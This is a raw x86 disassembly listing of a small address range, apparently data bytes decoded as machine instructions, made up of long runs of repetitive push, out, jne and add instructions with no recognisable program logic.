  442150:	add    BYTE PTR [eax],al
  442152:	sbb    al,0x2
  442154:	add    BYTE PTR [eax],al
  442156:	sbb    al,0x2
  442158:	add    BYTE PTR [eax],al
  44215a:	or     al,0x2
  44215c:	add    BYTE PTR [eax],al
  44215e:	or     al,0x2
  442160:	add    BYTE PTR [eax],al
  442162:	add    BYTE PTR [eax],al
  442164:	add    BYTE PTR [eax],al
  442166:	add    ah,bl
  442168:	add    DWORD PTR [eax],eax
  44216a:	add    ah,bl
  44216c:	add    DWORD PTR [eax],eax
  44216e:	add    ah,cl
  442170:	add    DWORD PTR [eax],eax
  442172:	add    ah,cl
  442174:	add    DWORD PTR [eax],eax
  442176:	add    ah,bl
  442178:	add    DWORD PTR [eax],eax
  44217a:	add    ah,bl
  44217c:	add    DWORD PTR [eax],eax
  44217e:	add    ah,cl
  442180:	add    DWORD PTR [eax],eax
  442182:	add    ah,cl
  442184:	add    DWORD PTR [eax],eax
  442186:	add    BYTE PTR [ecx+eax*1+0x19c0000],bl
  44218d:	add    BYTE PTR [eax],al
  44218f:	mov    WORD PTR [ecx],es
  442191:	add    BYTE PTR [eax],al
  442193:	mov    WORD PTR [ecx],es
  442195:	add    BYTE PTR [eax],al
  442197:	pushf  
  442198:	add    DWORD PTR [eax],eax
  44219a:	add    BYTE PTR [ecx+eax*1+0x18c0000],bl
  4421a1:	add    BYTE PTR [eax],al
  4421a3:	mov    WORD PTR [ecx],es
  4421a5:	add    BYTE PTR [eax],al
  4421a7:	pop    esp
  4421a8:	add    DWORD PTR [eax],eax
  4421aa:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4421ae:	add    BYTE PTR [ecx+eax*1+0x0],cl
  4421b2:	add    BYTE PTR [ecx+eax*1+0x0],cl
  4421b6:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4421ba:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4421be:	add    BYTE PTR [ebp+0x2b],dh
  4421c1:	cld    
  4421c2:	push   DWORD PTR [ebp+0x2b]
  4421c5:	cld    
  4421c6:	push   DWORD PTR [ebp+0x2b]
  4421c9:	cld    
  4421ca:	inc    DWORD PTR [eax]
  4421cc:	add    BYTE PTR [eax],al
  4421ce:	add    BYTE PTR [eax],al
  4421d0:	jne    0x4421fd
  4421d2:	cld    
  4421d3:	push   DWORD PTR [ebp+0x2b]
  4421d6:	cld    
  4421d7:	push   DWORD PTR [ebp+0x2b]
  4421da:	cld    
  4421db:	push   DWORD PTR [ebp+0x2b]
  4421de:	cld    
  4421df:	push   DWORD PTR [ebp+0x2b]
  4421e2:	cld    
  4421e3:	push   DWORD PTR [ebp+0x2b]
  4421e6:	cld    
  4421e7:	push   DWORD PTR [ebp+0x2b]
  4421ea:	cld    
  4421eb:	push   DWORD PTR [ebp+0x2b]
  4421ee:	cld    
  4421ef:	push   DWORD PTR [ebp+0x2b]
  4421f2:	cld    
  4421f3:	push   DWORD PTR [ebp+0x2b]
  4421f6:	cld    
  4421f7:	push   DWORD PTR [ebp+0x2b]
  4421fa:	cld    
  4421fb:	push   DWORD PTR [ebp+0x2b]
  4421fe:	cld    
  4421ff:	push   DWORD PTR [ebp+0x2b]
  442202:	cld    
  442203:	push   DWORD PTR [ebp+0x2b]
  442206:	cld    
  442207:	push   DWORD PTR [ebp+0x2b]
  44220a:	cld    
  44220b:	push   DWORD PTR [ebp+0x2b]
  44220e:	cld    
  44220f:	push   DWORD PTR [ebp+0x2b]
  442212:	cld    
  442213:	push   DWORD PTR [ebp+0x2b]
  442216:	cld    
  442217:	push   DWORD PTR [ebp+0x2b]
  44221a:	cld    
  44221b:	push   DWORD PTR [ebp+0x2b]
  44221e:	cld    
  44221f:	push   DWORD PTR [ebp+0x2b]
  442222:	cld    
  442223:	push   DWORD PTR [ebp+0x2b]
  442226:	cld    
  442227:	push   DWORD PTR [ebp+0x2b]
  44222a:	cld    
  44222b:	push   DWORD PTR [ebp+0x29]
  44222e:	cld    
  44222f:	push   DWORD PTR [ebp+0x29]
  442232:	cld    
  442233:	inc    DWORD PTR [eax]
  442235:	add    BYTE PTR [eax],al
  442237:	add    BYTE PTR [eax],al
  442239:	jne    0x442264
  44223b:	cld    
  44223c:	push   DWORD PTR [ebp+0x29]
  44223f:	cld    
  442240:	push   DWORD PTR [ebp+0x2]
  442243:	out    0x3,eax
  442245:	jne    0x442249
  442247:	out    0x3,eax
  442249:	jne    0x44224d
  44224b:	out    0x3,eax
  44224d:	jne    0x442251
  44224f:	out    0x3,eax
  442251:	jne    0x442255
  442253:	out    0x3,eax
  442255:	jne    0x442259
  442257:	out    0x3,eax
  442259:	jne    0x44225d
  44225b:	out    0x3,eax
  44225d:	jne    0x442261
  44225f:	out    0x3,eax
  442261:	jne    0x442265
  442263:	out    0x3,eax
  442265:	jne    0x442269
  442267:	out    0x3,eax
  442269:	jne    0x44226d
  44226b:	out    0x3,eax
  44226d:	jne    0x442271
  44226f:	out    0x3,eax
  442271:	jne    0x442275
  442273:	out    0x3,eax
  442275:	jne    0x442279
  442277:	out    0x3,eax
  442279:	jne    0x44227d
  44227b:	out    0x3,eax
  44227d:	jne    0x442281
  44227f:	out    0x3,eax
  442281:	jne    0x442285
  442283:	out    0x3,eax
  442285:	jne    0x442289
  442287:	out    0x3,eax
  442289:	jne    0x44228d
  44228b:	out    0x3,eax
  44228d:	jne    0x442291
  44228f:	out    0x3,eax
  442291:	jne    0x442295
  442293:	out    0x3,eax
  442295:	jne    0x442299
  442297:	out    0x3,eax
  442299:	jne    0x44229d
  44229b:	out    0x3,eax
  44229d:	add    BYTE PTR [eax],al
  44229f:	add    BYTE PTR [eax],al
  4422a1:	add    BYTE PTR [ebp+0x2],dh
  4422a4:	out    0x3,eax
  4422a6:	jne    0x4422aa
  4422a8:	out    0x3,eax
  4422aa:	jne    0x4422ae
  4422ac:	out    0x3,eax
  4422ae:	jne    0x4422b2
  4422b0:	out    0x3,eax
  4422b2:	jne    0x4422b6
  4422b4:	out    0x3,eax
  4422b6:	jne    0x4422ba
  4422b8:	out    0x3,eax
  4422ba:	jne    0x4422be
  4422bc:	out    0x3,eax
  4422be:	jne    0x4422c2
  4422c0:	add    cl,ch
  4422c2:	jbe    0x4422c6
  4422c4:	add    cl,ch
  4422c6:	jbe    0x4422ca
  4422c8:	add    cl,ch
  4422ca:	jbe    0x4422ce
  4422cc:	add    cl,ch
  4422ce:	jbe    0x4422d2
  4422d0:	add    cl,ch
  4422d2:	jbe    0x4422d6
  4422d4:	add    cl,ch
  4422d6:	jbe    0x4422da
  4422d8:	add    cl,ch
  4422da:	jbe    0x4422de
  4422dc:	add    cl,ch
  4422de:	jbe    0x4422e2
  4422e0:	add    cl,ch
  4422e2:	jbe    0x4422e6
  4422e4:	add    cl,ch
  4422e6:	jbe    0x4422ea
  4422e8:	add    cl,ch
  4422ea:	jbe    0x4422ee
  4422ec:	add    cl,ch
  4422ee:	jbe    0x4422f2
  4422f0:	add    cl,ch
  4422f2:	jbe    0x4422f6
  4422f4:	add    cl,ch
  4422f6:	jbe    0x4422fa
  4422f8:	add    cl,ch
  4422fa:	jbe    0x4422fe
  4422fc:	add    cl,ch
  4422fe:	jbe    0x442302
  442300:	add    cl,ch
  442302:	jbe    0x442306
  442304:	add    cl,ch
  442306:	add    BYTE PTR [eax],al
  442308:	add    BYTE PTR [eax],al
  44230a:	add    BYTE PTR [esi+0x2],dh
  44230d:	add    cl,ch
  44230f:	jbe    0x442313
  442311:	add    cl,ch
  442313:	jbe    0x442317
  442315:	add    cl,ch
  442317:	jbe    0x44231b
  442319:	add    cl,ch
  44231b:	jbe    0x44231f
  44231d:	add    cl,ch
  44231f:	jbe    0x442323
  442321:	add    cl,ch
  442323:	jbe    0x442327
  442325:	add    cl,ch
  442327:	jbe    0x44232b
  442329:	add    cl,ch
  44232b:	jbe    0x44232f
  44232d:	add    cl,ch
  44232f:	jbe    0x442333
  442331:	add    cl,ch
  442333:	jbe    0x442337
  442335:	add    cl,ch
  442337:	jbe    0x44233b
  442339:	add    cl,ch
  44233b:	jbe    0x44233f
  44233d:	add    BYTE PTR [eax],al
  44233f:	pop    esp
  442340:	push   es
  442341:	add    BYTE PTR [eax],al
  442343:	dec    esp
  442344:	push   es
  442345:	add    BYTE PTR [eax],al
  442347:	dec    esp
  442348:	push   es
  442349:	add    BYTE PTR [eax],al
  44234b:	pop    esp
  44234c:	push   es
  44234d:	add    BYTE PTR [eax],al
  44234f:	pop    esp
  442350:	push   es
  442351:	add    BYTE PTR [eax],al
  442353:	dec    esp
  442354:	push   es
  442355:	add    BYTE PTR [eax],al
  442357:	dec    esp
  442358:	push   es
  442359:	add    BYTE PTR [eax],al
  44235b:	sbb    al,0x6
  44235d:	add    BYTE PTR [eax],al
  44235f:	sbb    al,0x6
  442361:	add    BYTE PTR [eax],al
  442363:	or     al,0x6
  442365:	add    BYTE PTR [eax],al
  442367:	or     al,0x6
  442369:	add    BYTE PTR [eax],al
  44236b:	sbb    al,0x6
  44236d:	add    BYTE PTR [eax],al
  44236f:	add    BYTE PTR [eax],al
  442371:	add    BYTE PTR [eax],al
  442373:	add    BYTE PTR [esi+eax*1],bl
  442376:	add    BYTE PTR [eax],al
  442378:	or     al,0x6
  44237a:	add    BYTE PTR [eax],al
  44237c:	or     al,0x6
  44237e:	add    BYTE PTR [eax],al
  442380:	fadd   QWORD PTR ds:0x5dc0000
  442386:	add    BYTE PTR [eax],al
  442388:	int3   
  442389:	add    eax,0x5cc0000
  44238e:	add    BYTE PTR [eax],al
  442390:	fadd   QWORD PTR ds:0x5dc0000
  442396:	add    BYTE PTR [eax],al
  442398:	int3   
  442399:	add    eax,0x5cc0000
  44239e:	add    BYTE PTR [eax],al
  4423a0:	pushf  
  4423a1:	add    eax,0x59c0000
  4423a6:	add    BYTE PTR [eax],al
  4423a8:	mov    WORD PTR ds:0x58c0000,es
  4423ae:	add    BYTE PTR [eax],al
  4423b0:	pushf  
  4423b1:	add    eax,0x59c0000
  4423b6:	add    BYTE PTR [eax],al
  4423b8:	mov    WORD PTR ds:0x2b750000,es
  4423be:	cld    
  4423bf:	push   DWORD PTR [ebp+0x2b]
  4423c2:	cld    
  4423c3:	push   DWORD PTR [ebp+0x2b]
  4423c6:	cld    
  4423c7:	push   DWORD PTR [ebp+0x2b]
  4423ca:	cld    
  4423cb:	push   DWORD PTR [ebp+0x2b]
  4423ce:	cld    
  4423cf:	push   DWORD PTR [ebp+0x2b]
  4423d2:	cld    
  4423d3:	push   DWORD PTR [ebp+0x2b]
  4423d6:	cld    
  4423d7:	inc    DWORD PTR [eax]
  4423d9:	add    BYTE PTR [eax],al
  4423db:	add    BYTE PTR [eax],al
  4423dd:	jne    0x44240a
  4423df:	cld    
  4423e0:	push   DWORD PTR [ebp+0x2b]
  4423e3:	cld    
  4423e4:	push   DWORD PTR [ebp+0x2b]
  4423e7:	cld    
  4423e8:	push   DWORD PTR [ebp+0x2b]
  4423eb:	cld    
  4423ec:	push   DWORD PTR [ebp+0x2b]
  4423ef:	cld    
  4423f0:	push   DWORD PTR [ebp+0x2b]
  4423f3:	cld    
  4423f4:	push   DWORD PTR [ebp+0x2b]
  4423f7:	cld    
  4423f8:	push   DWORD PTR [ebp+0x2b]
  4423fb:	cld    
  4423fc:	push   DWORD PTR [ebp+0x2b]
  4423ff:	cld    
  442400:	push   DWORD PTR [ebp+0x2b]
  442403:	cld    
  442404:	push   DWORD PTR [ebp+0x2b]
  442407:	cld    
  442408:	push   DWORD PTR [ebp+0x2b]
  44240b:	cld    
  44240c:	push   DWORD PTR [ebp+0x2b]
  44240f:	cld    
  442410:	push   DWORD PTR [ebp+0x2b]
  442413:	cld    
  442414:	push   DWORD PTR [ebp+0x2b]
  442417:	cld    
  442418:	push   DWORD PTR [ebp+0x2b]
  44241b:	cld    
  44241c:	push   DWORD PTR [ebp+0x2b]
  44241f:	cld    
  442420:	push   DWORD PTR [ebp+0x2b]
  442423:	cld    
  442424:	push   DWORD PTR [ebp+0x2b]
  442427:	cld    
  442428:	push   DWORD PTR [ebp+0x2b]
  44242b:	cld    
  44242c:	push   DWORD PTR [ebp+0x2b]
  44242f:	cld    
  442430:	push   DWORD PTR [ebp+0x2b]
  442433:	cld    
  442434:	push   DWORD PTR [ebp+0x2b]
  442437:	cld    
  442438:	push   DWORD PTR [ebp+0x2]
  44243b:	out    0x3,eax
  44243d:	jne    0x442441
  44243f:	out    0x3,eax
  442441:	add    BYTE PTR [eax],al
  442443:	add    BYTE PTR [eax],al
  442445:	add    BYTE PTR [ebp+0x2],dh
  442448:	out    0x3,eax
  44244a:	jne    0x44244e
  44244c:	out    0x3,eax
  44244e:	jne    0x442452
  442450:	out    0x3,eax
  442452:	jne    0x442456
  442454:	out    0x3,eax
  442456:	jne    0x44245a
  442458:	out    0x3,eax
  44245a:	jne    0x44245e
  44245c:	out    0x3,eax
  44245e:	jne    0x442462
  442460:	out    0x3,eax
  442462:	jne    0x442466
  442464:	out    0x3,eax
  442466:	jne    0x44246a
  442468:	out    0x3,eax
  44246a:	jne    0x44246e
  44246c:	out    0x3,eax
  44246e:	jne    0x442472
  442470:	out    0x3,eax
  442472:	jne    0x442476
  442474:	out    0x3,eax
  442476:	jne    0x44247a
  442478:	out    0x3,eax
  44247a:	jne    0x44247e
  44247c:	out    0x3,eax
  44247e:	jne    0x442482
  442480:	out    0x3,eax
  442482:	jne    0x442486
  442484:	out    0x3,eax
  442486:	jne    0x44248a
  442488:	out    0x3,eax
  44248a:	jne    0x44248e
  44248c:	out    0x3,eax
  44248e:	jne    0x442492
  442490:	out    0x3,eax
  442492:	jne    0x442496
  442494:	out    0x3,eax
  442496:	jne    0x44249a
  442498:	out    0x3,eax
  44249a:	jne    0x44249e
  44249c:	out    0x3,eax
  44249e:	jne    0x4424a2
  4424a0:	out    0x3,eax
  4424a2:	jne    0x4424a6
  4424a4:	out    0x3,eax
  4424a6:	jne    0x4424aa
  4424a8:	out    0x3,eax
  4424aa:	add    BYTE PTR [eax],al
  4424ac:	add    BYTE PTR [eax],al
  4424ae:	add    BYTE PTR [ebp+0x2],dh
  4424b1:	out    0x3,eax
  4424b3:	jne    0x4424b7
  4424b5:	out    0x3,eax
  4424b7:	jne    0x4424bb
  4424b9:	out    0x3,eax
  4424bb:	jne    0x4424bf
  4424bd:	add    cl,ch
  4424bf:	jbe    0x4424c3
  4424c1:	add    cl,ch
  4424c3:	jbe    0x4424c7
  4424c5:	add    cl,ch
  4424c7:	jbe    0x4424cb
  4424c9:	add    cl,ch
  4424cb:	jbe    0x4424cf
  4424cd:	add    cl,ch
  4424cf:	jbe    0x4424d3
  4424d1:	add    cl,ch
  4424d3:	jbe    0x4424d7
  4424d5:	add    cl,ch
  4424d7:	jbe    0x4424db
  4424d9:	add    cl,ch
  4424db:	jbe    0x4424df
  4424dd:	add    cl,ch
  4424df:	jbe    0x4424e3
  4424e1:	add    cl,ch
  4424e3:	jbe    0x4424e7
  4424e5:	add    cl,ch
  4424e7:	jbe    0x4424eb
  4424e9:	add    cl,ch
  4424eb:	jbe    0x4424ef
  4424ed:	add    cl,ch
  4424ef:	jbe    0x4424f3
  4424f1:	add    cl,ch
  4424f3:	jbe    0x4424f7
  4424f5:	add    cl,ch
  4424f7:	jbe    0x4424fb
  4424f9:	add    cl,ch
  4424fb:	jbe    0x4424ff
  4424fd:	add    cl,ch
  4424ff:	jbe    0x442503
  442501:	add    cl,ch
  442503:	jbe    0x442507
  442505:	add    cl,ch
  442507:	jbe    0x44250b
  442509:	add    cl,ch
  44250b:	jbe    0x44250f
  44250d:	add    cl,ch
  44250f:	jbe    0x442513
  442511:	add    cl,ch
  442513:	add    BYTE PTR [eax],al
  442515:	add    BYTE PTR [eax],al
  442517:	add    BYTE PTR [esi+0x2],dh
  44251a:	add    cl,ch
  44251c:	jbe    0x442520
  44251e:	add    cl,ch
  442520:	jbe    0x442524
  442522:	add    cl,ch
  442524:	jbe    0x442528
  442526:	add    cl,ch
  442528:	jbe    0x44252c
  44252a:	add    cl,ch
  44252c:	jbe    0x442530
  44252e:	add    cl,ch
  442530:	jbe    0x442534
  442532:	add    cl,ch
  442534:	jbe    0x442538
  442536:	add    cl,ch
  442538:	jbe    0x44253c
  44253a:	add    BYTE PTR [eax],al
  44253c:	mov    WORD PTR [edx],es
  44253e:	add    BYTE PTR [eax],al
  442540:	mov    WORD PTR [edx],es
  442542:	add    BYTE PTR [eax],al
  442544:	pushf  
  442545:	add    al,BYTE PTR [eax]
  442547:	add    BYTE PTR [edx+eax*1+0x28c0000],bl
  44254e:	add    BYTE PTR [eax],al
  442550:	mov    WORD PTR [edx],es
  442552:	add    BYTE PTR [eax],al
  442554:	pop    esp
  442555:	add    al,BYTE PTR [eax]
  442557:	add    BYTE PTR [edx+eax*1+0x0],bl
  44255b:	add    BYTE PTR [edx+eax*1+0x0],cl
  44255f:	add    BYTE PTR [edx+eax*1+0x0],cl
  442563:	add    BYTE PTR [edx+eax*1+0x0],bl
  442567:	add    BYTE PTR [edx+eax*1+0x0],bl
  44256b:	add    BYTE PTR [edx+eax*1+0x0],cl
  44256f:	add    BYTE PTR [edx+eax*1+0x0],cl
  442573:	add    BYTE PTR [edx+eax*1],bl
  442576:	add    BYTE PTR [eax],al
  442578:	sbb    al,0x2
  44257a:	add    BYTE PTR [eax],al
  44257c:	add    BYTE PTR [eax],al
  44257e:	add    BYTE PTR [eax],al
  442580:	add    BYTE PTR [edx+eax*1],cl
  442583:	add    BYTE PTR [eax],al
  442585:	or     al,0x2
  442587:	add    BYTE PTR [eax],al
  442589:	sbb    al,0x2
  44258b:	add    BYTE PTR [eax],al
  44258d:	sbb    al,0x2
  44258f:	add    BYTE PTR [eax],al
  442591:	or     al,0x2
  442593:	add    BYTE PTR [eax],al
  442595:	or     al,0x2
  442597:	add    BYTE PTR [eax],al
  442599:	fadd   QWORD PTR [ecx]
  44259b:	add    BYTE PTR [eax],al
  44259d:	fadd   QWORD PTR [ecx]
  44259f:	add    BYTE PTR [eax],al
  4425a1:	int3   
  4425a2:	add    DWORD PTR [eax],eax
  4425a4:	add    ah,cl
  4425a6:	add    DWORD PTR [eax],eax
  4425a8:	add    ah,bl
  4425aa:	add    DWORD PTR [eax],eax
  4425ac:	add    ah,bl
  4425ae:	add    DWORD PTR [eax],eax
  4425b0:	add    ah,cl
  4425b2:	add    DWORD PTR [eax],eax
  4425b4:	add    ah,cl
  4425b6:	add    DWORD PTR [eax],eax
  4425b8:	add    BYTE PTR [ebp+0x2b],dh
  4425bb:	cld    
  4425bc:	push   DWORD PTR [ebp+0x2b]
  4425bf:	cld    
  4425c0:	push   DWORD PTR [ebp+0x2b]
  4425c3:	cld    
  4425c4:	push   DWORD PTR [ebp+0x2b]
  4425c7:	cld    
  4425c8:	push   DWORD PTR [ebp+0x2b]
  4425cb:	cld    
  4425cc:	push   DWORD PTR [ebp+0x2b]
  4425cf:	cld    
  4425d0:	push   DWORD PTR [ebp+0x2b]
  4425d3:	cld    
  4425d4:	push   DWORD PTR [ebp+0x2b]
  4425d7:	cld    
  4425d8:	push   DWORD PTR [ebp+0x2b]
  4425db:	cld    
  4425dc:	push   DWORD PTR [ebp+0x2b]
  4425df:	cld    
  4425e0:	push   DWORD PTR [ebp+0x2b]
  4425e3:	cld    
  4425e4:	inc    DWORD PTR [eax]
  4425e6:	add    BYTE PTR [eax],al
  4425e8:	add    BYTE PTR [eax],al
  4425ea:	jne    0x442617
  4425ec:	cld    
  4425ed:	push   DWORD PTR [ebp+0x2b]
  4425f0:	cld    
  4425f1:	push   DWORD PTR [ebp+0x2b]
  4425f4:	cld    
  4425f5:	push   DWORD PTR [ebp+0x2b]
  4425f8:	cld    
  4425f9:	push   DWORD PTR [ebp+0x2b]
  4425fc:	cld    
  4425fd:	push   DWORD PTR [ebp+0x2b]
  442600:	cld    
  442601:	push   DWORD PTR [ebp+0x2b]
  442604:	cld    
  442605:	push   DWORD PTR [ebp+0x2b]
  442608:	cld    
  442609:	push   DWORD PTR [ebp+0x2b]
  44260c:	cld    
  44260d:	push   DWORD PTR [ebp+0x2b]
  442610:	cld    
  442611:	push   DWORD PTR [ebp+0x2b]
  442614:	cld    
  442615:	push   DWORD PTR [ebp+0x2b]
  442618:	cld    
  442619:	push   DWORD PTR [ebp+0x2b]
  44261c:	cld    
  44261d:	push   DWORD PTR [ebp+0x2b]
  442620:	cld    
  442621:	push   DWORD PTR [ebp+0x2b]
  442624:	cld    
  442625:	push   DWORD PTR [ebp+0x2b]
  442628:	cld    
  442629:	push   DWORD PTR [ebp+0x2b]
  44262c:	cld    
  44262d:	push   DWORD PTR [ebp+0x2b]
  442630:	cld    
  442631:	push   DWORD PTR [ebp+0x2b]
  442634:	cld    
  442635:	push   DWORD PTR [ebp+0x2]
  442638:	out    0x3,eax
  44263a:	jne    0x44263e
  44263c:	out    0x3,eax
  44263e:	jne    0x442642
  442640:	out    0x3,eax
  442642:	jne    0x442646
  442644:	out    0x3,eax
  442646:	jne    0x44264a
  442648:	out    0x3,eax
  44264a:	jne    0x44264e
  44264c:	out    0x3,eax
  44264e:	add    BYTE PTR [eax],al
  442650:	add    BYTE PTR [eax],al
  442652:	add    BYTE PTR [ebp+0x2],dh
  442655:	out    0x3,eax
  442657:	jne    0x44265b
  442659:	out    0x3,eax
  44265b:	jne    0x44265f
  44265d:	out    0x3,eax
  44265f:	jne    0x442663
  442661:	out    0x3,eax
  442663:	jne    0x442667
  442665:	out    0x3,eax
  442667:	jne    0x44266b
  442669:	out    0x3,eax
  44266b:	jne    0x44266f
  44266d:	out    0x3,eax
  44266f:	jne    0x442673
  442671:	out    0x3,eax
  442673:	jne    0x442677
  442675:	out    0x3,eax
  442677:	jne    0x44267b
  442679:	out    0x3,eax
  44267b:	jne    0x44267f
  44267d:	out    0x3,eax
  44267f:	jne    0x442683
  442681:	out    0x3,eax
  442683:	jne    0x442687
  442685:	out    0x3,eax
  442687:	jne    0x44268b
  442689:	out    0x3,eax
  44268b:	jne    0x44268f
  44268d:	out    0x3,eax
  44268f:	jne    0x442693
  442691:	out    0x3,eax
  442693:	jne    0x442697
  442695:	out    0x3,eax
  442697:	jne    0x44269b
  442699:	out    0x3,eax
  44269b:	jne    0x44269f
  44269d:	out    0x3,eax
  44269f:	jne    0x4426a3
  4426a1:	out    0x3,eax
  4426a3:	jne    0x4426a7
  4426a5:	out    0x3,eax
  4426a7:	jne    0x4426ab
  4426a9:	out    0x3,eax
  4426ab:	jne    0x4426af
  4426ad:	out    0x3,eax
  4426af:	jne    0x4426b3
  4426b1:	out    0x3,eax
  4426b3:	jne    0x4426b7
  4426b5:	add    cl,ch
  4426b7:	add    BYTE PTR [eax],al
  4426b9:	add    BYTE PTR [eax],al
  4426bb:	add    BYTE PTR [esi+0x2],dh
  4426be:	add    cl,ch
  4426c0:	jbe    0x4426c4
  4426c2:	add    cl,ch
  4426c4:	jbe    0x4426c8
  4426c6:	add    cl,ch
  4426c8:	jbe    0x4426cc
  4426ca:	add    cl,ch
  4426cc:	jbe    0x4426d0
  4426ce:	add    cl,ch
  4426d0:	jbe    0x4426d4
  4426d2:	add    cl,ch
  4426d4:	jbe    0x4426d8
  4426d6:	add    cl,ch
  4426d8:	jbe    0x4426dc
  4426da:	add    cl,ch
  4426dc:	jbe    0x4426e0
  4426de:	add    cl,ch
  4426e0:	jbe    0x4426e4
  4426e2:	add    cl,ch
  4426e4:	jbe    0x4426e8
  4426e6:	add    cl,ch
  4426e8:	jbe    0x4426ec
  4426ea:	add    cl,ch
  4426ec:	jbe    0x4426f0
  4426ee:	add    cl,ch
  4426f0:	jbe    0x4426f4
  4426f2:	add    cl,ch
  4426f4:	jbe    0x4426f8
  4426f6:	add    cl,ch
  4426f8:	jbe    0x4426fc
  4426fa:	add    cl,ch
  4426fc:	jbe    0x442700
  4426fe:	add    cl,ch
  442700:	jbe    0x442704
  442702:	add    cl,ch
  442704:	jbe    0x442708
  442706:	add    cl,ch
  442708:	jbe    0x44270c
  44270a:	add    cl,ch
  44270c:	jbe    0x442710
  44270e:	add    cl,ch
  442710:	jbe    0x442714
  442712:	add    cl,ch
  442714:	jbe    0x442718
  442716:	add    cl,ch
  442718:	jbe    0x44271c
  44271a:	add    cl,ch
  44271c:	jbe    0x442720
  44271e:	add    cl,ch
  442720:	add    BYTE PTR [eax],al
  442722:	add    BYTE PTR [eax],al
  442724:	add    BYTE PTR [esi+0x2],dh
  442727:	add    cl,ch
  442729:	jbe    0x44272d
  44272b:	add    cl,ch
  44272d:	jbe    0x442731
  44272f:	add    cl,ch
  442731:	jbe    0x442735
  442733:	add    cl,ch
  442735:	jbe    0x442739
  442737:	add    BYTE PTR [eax],al
  442739:	int3   
  44273a:	(bad)  
  44273b:	(bad)  
  44273c:	(bad)  
  44273d:	fdiv   st(6),st
  44273f:	(bad)  
  442740:	(bad)  
  442741:	fdiv   st(6),st
  442743:	(bad)  
  442744:	dec    esp
  442746:	(bad)  
  442747:	(bad)  
  442748:	dec    esp
  44274a:	(bad)  
  44274b:	(bad)  
  44274c:	call   FWORD PTR [esi+edi*8-0x1630001]
  442753:	(bad)  
  442754:	dec    DWORD PTR [esi+edi*8-0x1730001]
  44275b:	(bad)  
  44275c:	call   FWORD PTR [esi+edi*8-0x1630001]
  442763:	(bad)  
  442764:	dec    DWORD PTR [esi+edi*8-0x1730001]
  44276b:	(bad)  
  44276c:	call   FWORD PTR [esi+eax*1+0x0]
  442770:	add    BYTE PTR [esi+eax*1+0x0],bl
  442774:	add    BYTE PTR [esi+eax*1+0x0],cl
  442778:	add    BYTE PTR [esi+eax*1+0x0],cl
  44277c:	add    BYTE PTR [esi+eax*1+0x0],bl
  442780:	add    BYTE PTR [esi+eax*1+0x0],bl
  442784:	add    BYTE PTR [esi+eax*1+0x0],cl
  442788:	add    BYTE PTR [eax],al
  44278a:	add    BYTE PTR [eax],al
  44278c:	add    BYTE PTR [eax],al
  44278e:	dec    esp
  44278f:	push   es
  442790:	add    BYTE PTR [eax],al
  442792:	sbb    al,0x6
  442794:	add    BYTE PTR [eax],al
  442796:	sbb    al,0x6
  442798:	add    BYTE PTR [eax],al
  44279a:	or     al,0x6
  44279c:	add    BYTE PTR [eax],al
  44279e:	or     al,0x6
  4427a0:	add    BYTE PTR [eax],al
  4427a2:	sbb    al,0x6
  4427a4:	add    BYTE PTR [eax],al
  4427a6:	sbb    al,0x6
  4427a8:	add    BYTE PTR [eax],al
  4427aa:	or     al,0x6
  4427ac:	add    BYTE PTR [eax],al
  4427ae:	or     al,0x6
  4427b0:	add    BYTE PTR [eax],al
  4427b2:	fadd   QWORD PTR ds:0x1b750000
  4427b8:	cld    
  4427b9:	push   DWORD PTR [ebp+0x1b]
  4427bc:	cld    
  4427bd:	push   DWORD PTR [ebp+0x1b]
  4427c0:	cld    
  4427c1:	push   DWORD PTR [ebp+0x1b]
  4427c4:	cld    
  4427c5:	push   DWORD PTR [ebp+0x1b]
  4427c8:	cld    
  4427c9:	push   DWORD PTR [ebp+0x1b]
  4427cc:	cld    
  4427cd:	push   DWORD PTR [ebp+0x1b]
  4427d0:	cld    
  4427d1:	push   DWORD PTR [ebp+0x1b]
  4427d4:	cld    
  4427d5:	push   DWORD PTR [ebp+0x1b]
  4427d8:	cld    
  4427d9:	push   DWORD PTR [ebp+0x1b]
  4427dc:	cld    
  4427dd:	push   DWORD PTR [ebp+0x1b]
  4427e0:	cld    
  4427e1:	push   DWORD PTR [ebp+0x1b]
  4427e4:	cld    
  4427e5:	push   DWORD PTR [ebp+0x1b]
  4427e8:	cld    
  4427e9:	push   DWORD PTR [ebp+0x1b]
  4427ec:	cld    
  4427ed:	push   DWORD PTR [ebp+0x1b]
  4427f0:	cld    
  4427f1:	inc    DWORD PTR [eax]
  4427f3:	add    BYTE PTR [eax],al
  4427f5:	add    BYTE PTR [eax],al
  4427f7:	jne    0x442814
  4427f9:	cld    
  4427fa:	push   DWORD PTR [ebp+0x1b]
  4427fd:	cld    
  4427fe:	push   DWORD PTR [ebp+0x1b]
  442801:	cld    
  442802:	push   DWORD PTR [ebp+0x1b]
  442805:	cld    
  442806:	push   DWORD PTR [ebp+0x1b]
  442809:	cld    
  44280a:	push   DWORD PTR [ebp+0x1b]
  44280d:	cld    
  44280e:	push   DWORD PTR [ebp+0x1b]
  442811:	cld    
  442812:	push   DWORD PTR [ebp+0x1b]
  442815:	cld    
  442816:	push   DWORD PTR [ebp+0x1b]
  442819:	cld    
  44281a:	push   DWORD PTR [ebp+0x1b]
  44281d:	cld    
  44281e:	push   DWORD PTR [ebp+0x1b]
  442821:	cld    
  442822:	push   DWORD PTR [ebp+0x1b]
  442825:	cld    
  442826:	push   DWORD PTR [ebp+0x1b]
  442829:	cld    
  44282a:	push   DWORD PTR [ebp+0x1b]
  44282d:	cld    
  44282e:	push   DWORD PTR [ebp+0x1b]
  442831:	cld    
  442832:	push   DWORD PTR [ebp+0x2]
  442835:	out    0x3,eax
  442837:	jne    0x44283b
  442839:	out    0x3,eax
  44283b:	jne    0x44283f
  44283d:	out    0x3,eax
  44283f:	jne    0x442843
  442841:	out    0x3,eax
  442843:	jne    0x442847
  442845:	out    0x3,eax
  442847:	jne    0x44284b
  442849:	out    0x3,eax
  44284b:	jne    0x44284f
  44284d:	out    0x3,eax
  44284f:	jne    0x442853
  442851:	out    0x3,eax
  442853:	jne    0x442857
  442855:	out    0x3,eax
  442857:	jne    0x44285b
  442859:	out    0x3,eax
  44285b:	add    BYTE PTR [eax],al
  44285d:	add    BYTE PTR [eax],al
  44285f:	add    BYTE PTR [ebp+0x2],dh
  442862:	out    0x3,eax
  442864:	jne    0x442868
  442866:	out    0x3,eax
  442868:	jne    0x44286c
  44286a:	out    0x3,eax
